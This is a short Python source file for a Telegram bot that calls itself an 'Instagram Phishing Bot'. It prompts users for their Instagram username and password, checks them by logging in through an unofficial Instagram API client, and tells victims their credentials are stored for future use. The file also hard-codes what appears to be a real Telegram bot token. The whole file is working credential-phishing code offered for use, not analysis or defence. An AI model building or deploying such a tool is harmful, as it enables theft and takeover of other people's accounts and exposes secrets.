import telebot
from instagram_private_api import Client

bot = telebot.TeleBot('6943861553:AAGXjdGb-HemS0RZbc2O6MSk3O0zlmMKUMY')

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.reply_to(message, "Welcome to Instagram Phishing Bot! Please enter your Instagram username and password.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    credentials = message.text.split(':')
    if len(credentials) == 2:
        username = credentials[0]
        password = credentials[1]
        
        try:
            api = Client(username, password)
            if api.login():
                bot.reply_to(message, "Successful login. Credentials stored for future use.")
                # Store the credentials for future use
            else:
                bot.reply_to(message, "Invalid login credentials. Please try again.")
        except Exception as e:
            bot.reply_to(message, "An error occurred during login. Please try again.")
    else:
        bot.reply_to(message, "Invalid input format. Please enter your credentials in the format 'username:password'.")

bot.polling()